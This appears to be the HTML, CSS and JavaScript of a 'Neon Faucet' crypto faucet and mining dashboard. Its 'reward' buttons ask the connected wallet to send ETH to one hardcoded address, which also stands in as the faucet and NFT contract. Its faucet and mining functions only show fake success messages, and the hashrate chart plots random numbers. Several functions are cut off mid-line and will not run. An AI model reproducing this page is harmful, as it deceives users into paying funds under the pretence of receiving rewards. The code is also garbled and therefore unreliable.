<style>

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:Arial,sans-serif;
}

body{
  background:#020617;
  color:white;
  min-height:100vh;

  display:flex;
  justify-content:center;
  align-items:center;

  padding:20px;
  overflow-x:hidden;
}

/* BACKGROUND */

.bg{
  position:fixed;

  width:60vw;
  height:60vw;

  max-width:700px;
  max-height:700px;

  background:linear-gradient(
    45deg,
    #00f0ff,
    #8b5cf6,
    #00f0ff
  );

  filter:blur(140px);
  opacity:.25;

  animation:rotate 10s linear infinite;

  z-index:1;
}

@keyframes rotate{
  from{
    transform:rotate(0deg);
  }
  to{
    transform:rotate(360deg);
  }
}

/* CARD */

.card{
  position:relative;
  z-index:10;

  width:100%;
  max-width:430px;

  background:rgba(15,23,42,.82);

  border:1px solid rgba(255,255,255,.1);

  backdrop-filter:blur(20px);

  padding:24px;
  border-radius:24px;

  box-shadow:
  0 0 40px rgba(0,0,0,.45);
}

/* TITLE */

h1{
  text-align:center;

  margin-bottom:20px;

  font-size:clamp(26px,5vw,38px);

  background:linear-gradient(
    90deg,
    #00f0ff,
    #8b5cf6
  );

  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
}

/* FORM */

input,
select,
button{
  width:100%;
  min-height:52px;

  border:none;
  outline:none;

  border-radius:14px;

  margin-top:12px;
}

/* INPUT */

input,
select{
  background:#0f172a;
  color:white;

  padding:14px;
  font-size:15px;
}

/* BUTTON */

button{
  cursor:pointer;

  font-size:15px;
  font-weight:bold;

  color:white;

  background:linear-gradient(
    90deg,
    #06b6d4,
    #8b5cf6
  );

  transition:.25s;
}

button:hover{
  transform:translateY(-2px);

  box-shadow:
  0 0 20px #06b6d4;
}

/* STATUS */

#status,
#rewardStatus{
  margin-top:18px;

  padding:14px;

  border-radius:14px;

  background:#0f172a;

  font-size:14px;
  line-height:1.6;

  word-break:break-word;

  border:1px solid rgba(255,255,255,.08);
}

.timer{
  margin-top:12px;
  text-align:center;

  color:#38bdf8;
  font-size:14px;
}

/* NFT */

.nft-box{
  margin-top:20px;

  padding:18px;

  border-radius:20px;

  background:rgba(255,255,255,.04);

  border:1px solid rgba(255,255,255,.08);

  text-align:center;
}

.nft-image{
  width:100%;
  height:auto;

  border-radius:16px;

  margin-bottom:15px;

  object-fit:cover;

  box-shadow:
  0 0 25px rgba(0,255,255,.25);
}

.nft-info h2{
  font-size:22px;
  margin-bottom:6px;
  color:#00f0ff;
}

.nft-info p{
  color:#cbd5e1;
  font-size:14px;
}

.support{
  margin-top:12px;

  color:#22c55e;

  font-weight:bold;

  font-size:18px;
}

/* CHART */

canvas{
  width:100% !important;
  max-width:100%;
  height:auto !important;
}

/* HASHRATE */

#live-hashrate{
  margin-top:10px;

  color:#00f0ff;
  font-weight:bold;

  text-align:center;
}

/* BUTTON GROUP */

.miner-buttons{
  display:grid;
  grid-template-columns:1fr 1fr 1fr;
  gap:10px;
  margin-top:10px;
}

/* MOBILE */

@media (max-width:600px){

  body{
    padding:14px;
    align-items:flex-start;
  }

  .card{
    padding:18px;
    border-radius:20px;
  }

  h1{
    font-size:30px;
  }

  button,
  input,
  select{
    min-height:50px;
    font-size:14px;
  }

  .miner-buttons{
    grid-template-columns:1fr;
  }

  .support{
    font-size:16px;
  }

}

</style>

<script type="module">

import {
  createAppKit
} from "https://esm.sh/@reown/appkit";

import {
  EthersAdapter
} from "https://esm.sh/@reown/appkit-adapter-ethers";

import {
  mainnet,
  arbitrum,
  sepolia
} from "https://esm.sh/@reown/appkit/networks";

import {
  BrowserProvider,
  parseEther
} from "https://esm.sh/ethers";

/* APPKIT */

const projectId =
"5022875ce6ee68917f103ff9b1e3422d";

const modal =
createAppKit({

  adapters:[
    new EthersAdapter()
  ],

  networks:[
    mainnet,
    arbitrum,
    sepolia
  ],

  metadata:{
    name:"Neon Faucet",
    description:"MultiChain Faucet",
    url:window.location.origin,
    icons:[
      "https://avatars.githubusercontent.com/u/179229932"
    ]
  },

  projectId

});

let provider;

modal.subscribeProviders((state)=>{

  provider = state?.eip155;

});

/* STATUS */

const statusBox =
document.getElementById("status");

function setStatus(msg){
  statusBox.innerHTML = msg;
}

/* CLAIM */

window.claimFaucet =
async function(){

  const wallet =
  document.getElementById(
    "wallet"
  ).value;

  const chainId =
  document.getElementById(
    "chain"
  ).value;

  if(!wallet){

    setStatus(
      "❌ Input wallet address"
    );

    return;
  }

  setStatus(
    "⚡ Processing faucet..."
  );

  await new Promise(
    r=>setTimeout(r,2000)
  );

  setStatus(`
    ✅ Faucet Success
    <br>
    Wallet: ${wallet}
    <br>
    Chain ID: ${chainId}
  `);

};

/* SEND REWARD */

window.sendReward =
async function(){

  try{

    if(!provider){

      alert(
        "Connect wallet first"
      );

      return;
    }

    const ethersProvider =
    new BrowserProvider(provider);

    const signer =
    await ethersProvider.getSigner();

    setStatus(
      "🚀 Sending transaction..."
    );

    const tx =
    await signer.sendTransaction({

      to:
      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",

      value:
      parseEther("0.0001")

    });

    await tx.wait();

    setStatus(`
      ✅ Reward Sent
      <br>
      TX:
      ${tx.hash}
    `);

  }catch(err){

    console.log(err);

    setStatus(
      "❌ Transaction Failed"
    );

  }

};

/* SEND TX */

window.sendTx =
async function(){

  try{

    if(!provider){

      alert(
        "Wallet belum connect"
      );

      return;
    }

    const ethersProvider =
    new BrowserProvider(provider);

    const signer =
    await ethersProvider.getSigner();

    await signer.sendTransaction({

      to:
      "0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",

      value:

    console.log(tx);

    alert(
      "Transaction success"
    );

  }catch(err){

    console.log(err);

    alert(
      "Transaction failed"
    );

  }

};

/* GAS REWARD */

async function(){

    await signer.getAddress();

      r=>setTimeout(r,2000)

    rewardBox.innerHTML = `
      ✅ Gas Reward Success

  }catch(err){

    console.log(err);

    document.getElementById(
      "rewardStatus"
    ).innerHTML =
    "❌ Gas Reward Failed";

  }

};

/* MINING REWARD */

window.claimMiningReward =
async function(){

  try{

    if(!provider){

      alert(
        "Connect wallet first"
      );

      return;
    }

    const rewardBox =
    document.getElementById(
      "rewardStatus"
    );

    rewardBox.innerHTML =
    "⛏ Processing Mining Reward...";

    const ethersProvider =
    new BrowserProvider(provider);

    const signer =
    await ethersProvider.getSigner();

    const wallet =
    await signer.getAddress();

    let progress = 0;

    const mining =
    setInterval(()=>{

      progress += 10;

      rewardBox.innerHTML = `
        ⛏ Mining Reward
        <br>
        Progress: ${progress}%
      `;

      if(progress >= 100){

        clearInterval(mining);

        rewardBox.innerHTML = `
          ✅ Reward Success
          <br>
          Wallet: ${wallet}
          <br>
          Reward: 100 TOKEN
        `;

      }

    },500);

  }catch(err){

    console.log(err);

    document.getElementById(
      "rewardStatus"
    ).innerHTML =
    "❌ Mining Failed";

  }

};

/* NFT */

window.mintNFT =
async function(){

  try{

    if(!provider){

      alert(
        "Connect wallet first"

    const signer =

    alert(
      "Mint NFT Failed"

  }

/* CHART */

class LiveMinerDashboard{

  constructor(){

    this.chart = null;
    this.interval = null;

  }

  initChart(){

    const ctx =
    document.getElementById(
      "hashChart"
    );

    this.chart =
    new Chart(ctx,{

      type:"line",

      data:{

        labels:[],

        datasets:[{

          label:"Hashrate",

          data:[],

          borderColor:"#00f0ff",

          borderWidth:2,

          tension:.4

        }]

      },

      options:{

        responsive:true,

        plugins:{
          legend:{
            labels:{
              color:"#fff"
            }
          }
        },

        scales:{
          x:{
            ticks:{
              color:"#fff"
            }
          },

          y:{
            ticks:{
              color:"#fff"
            }
          }
        }

      }

    });

  }

  fakeMining(){

    if(this.interval) return;

    this.interval =
    setInterval(()=>{

      const rate =
      Math.floor(
        Math.random() * 1000
      );

      document
      .getElementById(
        "live-hashrate"
      )
      .innerHTML =
      rate + " H/s";

      this.chart
      .data
      .labels
      .push(
        new Date()
        .toLocaleTimeString()
      );

      this.chart
      .data
      .datasets[0]
      .data
      .push(rate);

      if(
        this.chart.data.labels.length
        > 20
      ){

        this.chart.data.labels.shift();

        this.chart
        .data
        .datasets[0]
        .data
        .shift();

      }

      this.chart.update();

    },1000);

  }

  stopMining(){

    clearInterval(
      this.interval
    );

    this.interval = null;

  }

}

const minerApp =
new LiveMinerDashboard();

minerApp.initChart();

/* BUTTONS */

document
.getElementById(
  "btn-start"
)
.onclick = ()=>{

  minerApp.fakeMining();

};

document
.getElementById(
  "btn-stop"
)
.onclick = ()=>{

  minerApp.stopMining();

};

document
.getElementById(
  "btn-clear"
)
.onclick = ()=>{

  localStorage.clear();

  location.reload();

};

</script>

// =======================
// GLOBAL
// =======================

let provider;
let signer;

const faucetAddress =
"0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88";

const nftAddress =
"0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88";

// =======================
// ABI
// =======================

const faucetAbi = [

"function requestTokens()"

];

const nftAbi = [

"function mint(address to,string uri)"

];

// =======================
// LOAD RPC TO SELECT
// =======================

function loadRPCs(){

const select =
document.getElementById("rpcSelector");

select.innerHTML = "";

RPC_LIST.forEach((rpc,index)=>{

const option =
document.createElement("option");

option.value = rpc.url;

option.innerHTML =
rpc.name;

select.appendChild(option);

});

}

// =======================
// TEST RPC
// =======================

async function checkRPC(){

const rpc =
document.getElementById(
"rpcSelector"
).value;

try{

const rpcProvider =
new ethers.JsonRpcProvider(rpc);

const block =
await rpcProvider.getBlockNumber();

document.getElementById(
"rpcStatus"
).innerHTML =

`
✅ RPC ACTIVE <br><br>
${rpc}
<br><br>
BLOCK : ${block}
`;

console.log(
"RPC ACTIVE:",
block
);

}catch(err){

console.log(err);

document.getElementById(
"rpcStatus"
).innerHTML =

`
❌ RPC FAILED
<br><br>
${err.message}
`;

}

}

// =======================
// AUTO TEST ALL RPC
// =======================

async function checkAllRPCs(){

for(let i=0;i<RPC_LIST.length;i++){

const rpc = RPC_LIST[i];

try{

const provider =
new ethers.JsonRpcProvider(
rpc.url
);

const block =
await provider.getBlockNumber();

console.log(
"✅",
rpc.name,
block
);

}catch(err){

console.log(
"❌",
rpc.name
);

}

}

}

// =======================
// CONNECT WALLET
// =======================

async function connectWallet(){

if(!window.ethereum){

alert(
"Install MetaMask"
);

return;

}

try{

provider =
new ethers.BrowserProvider(
window.ethereum
);

await provider.send(
"eth_requestAccounts",
[]
);

signer =
await provider.getSigner();

const address =
await signer.getAddress();

alert(
"Wallet Connected :\n\n" +
address
);

document.getElementById(
"rpcStatus"
).innerHTML =

`
✅ WALLET CONNECTED
<br><br>
${address}
`;

}catch(err){

console.log(err);

alert(
"Wallet Failed"
);

}

}

// =======================
// SEND TRANSACTION
// =======================

async function sendTx(){

if(!signer){

alert(
"Connect wallet first"
);

return;

}

try{

const tx =
await signer.sendTransaction({

to:
"0xd8519A8b8825Aa0DcC73aAD572f447FAE102fe88",

value:
ethers.parseEther(
"0.0001"
)

});

await tx.wait();

alert(
"Transaction Success ✅"
);

}catch(err){

console.log(err);

alert(
"Transaction Failed ❌"
);

}

}

// =======================
// REQUEST FAUCET
// =======================

async function requestFaucet(){

if(!signer){

alert(
"Connect wallet first"
);

return;

}

try{

const faucet =
new ethers.Contract(

faucetAddress,

faucetAbi,

signer

);

const tx =
await faucet.requestTokens();

await tx.wait();

alert(
"Faucet Success ✅"
);

}catch(err){

console.log(err);

alert(
"Faucet Failed ❌"
);

}

}

// =======================
// MINT NFT
// =======================

async function mintNFT(){

if(!signer){

alert(
"Connect wallet first"
);

return;

}

try{

const nft =
new ethers.Contract(

nftAddress,

nftAbi,

signer

);

const tx =
await nft.mint(

await signer.getAddress(),

"ipfs://metadata.json"

);

await tx.wait();

alert(
"NFT Minted ✅"
);

}catch(err){

console.log(err);

alert(
"Mint NFT Failed ❌"
);

}

}
